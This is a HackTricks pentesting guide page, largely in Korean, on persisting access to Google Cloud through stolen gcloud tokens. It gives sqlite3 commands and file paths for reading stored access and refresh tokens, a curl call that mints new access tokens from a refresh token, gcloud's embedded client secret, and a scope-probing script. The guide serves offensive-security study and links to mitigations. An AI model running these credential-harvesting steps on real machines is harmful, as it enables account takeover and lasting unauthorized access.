# GCP - Token Persistence

{{#include ../../../banners/hacktricks-training.md}}

### 인증된 사용자 Tokens

사용자의 **current token**을 얻으려면 다음을 실행하세요:

<details>

<summary>SQLite 데이터베이스에서 access token 가져오기</summary>
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
</details>

해당 페이지에서 이 token을 gcloud로 **직접 사용하는 방법**을 확인하세요:

{{#ref}}
https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#gcp
{{#endref}}

세부 정보를 얻어 **새 access token을 생성**하려면 다음을 실행하세요:

<details>

<summary>SQLite 데이터베이스에서 refresh token 가져오기</summary>
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
</details>

다음 위치에서도 refresh tokens를 찾을 수 있습니다: **`$HOME/.config/gcloud/application_default_credentials.json`** 및 **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

새로 갱신된 access token을 얻으려면 **refresh token**, client ID 및 client secret을 사용하여 다음을 실행하세요:

<details>

<summary>refresh token을 사용해 새로운 access token 얻기</summary>
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
리프레시 토큰의 유효성은 **Admin** > **Security** > **Google Cloud session control**에서 관리할 수 있으며, 기본값은 16h로 설정되어 있으나 만료되지 않도록 설정할 수도 있습니다:

<figure><img src="../../../images/image (11).png" alt=""><figcaption></figcaption></figure>

### 인증 흐름

`gcloud auth login` 같은 것을 사용할 때 인증 흐름은 브라우저에서 프롬프트를 열고, 모든 스코프를 승인하면 브라우저가 도구가 열어 놓은 HTTP 포트로 다음과 같은 요청을 보냅니다:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Then, gcloud will use the state and code with a some hardcoded `client_id` (`32555940559.apps.googleusercontent.com`) and **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) to get the **final refresh token data**.

> [!CAUTION]
> localhost와의 통신은 HTTP로 이루어지므로 데이터를 가로채 refresh token을 얻을 수 있습니다. 다만 이 데이터는 한 번만 유효하므로(일회용) 실용적이지 않습니다. 파일에서 refresh token을 직접 읽는 편이 더 쉽습니다.

### OAuth 스코프

모든 Google 스코프는 [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes)에서 확인하거나 다음을 실행하여 가져올 수 있습니다:

<details>

<summary>모든 Google OAuth 스코프 가져오기</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
</details>

이 스크립트로 **`gcloud`**가 인증에 사용하는 애플리케이션이 지원하는 권한 범위(scopes)를 확인할 수 있습니다:

<details>

<summary>gcloud에 대해 지원되는 권한 범위 테스트</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
</details>

실행한 후 이 앱이 다음 스코프를 지원하는 것으로 확인되었습니다:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
it's interesting to see how this app supports the **`drive`** scope, which could allow a user to escalate from GCP to Workspace if an attacker manages to force the user to generate a token with this scope.

**방법 확인** [**abuse this here**](../gcp-to-workspace-pivoting/index.html#abusing-gcloud)**.**

### 서비스 계정

인증된 사용자와 마찬가지로, 서비스 계정의 **개인 키 파일을 탈취(compromise the private key file)**하면 보통 **원하는 만큼 해당 계정에 접근할 수 있습니다(access it usually as long as you want)**.\
하지만 서비스 계정의 **OAuth token**을 탈취하면 상황이 더 흥미로워질 수 있습니다. 기본적으로 이러한 토큰은 보통 한 시간만 유효하지만, 만약 **피해자가 private api key를 삭제하더라도 OAuh token은 만료될 때까지 여전히 유효합니다**.

### 메타데이터

분명히, GCP 환경에서 실행 중인 머신 내부에 있는 한, 메타데이터 엔드포인트에 접속하여 해당 머신에 연결된 서비스 계정에 **접근할 수 있습니다(access the service account attached to that machine contacting the metadata endpoint)** (이 엔드포인트에서 접근할 수 있는 Oauth tokens는 보통 스코프로 제한됩니다).

### 완화 조치

이러한 기법들에 대한 일부 완화 조치는 [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)에 설명되어 있습니다

### 참고자료

- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{{#include ../../../banners/hacktricks-training.md}}
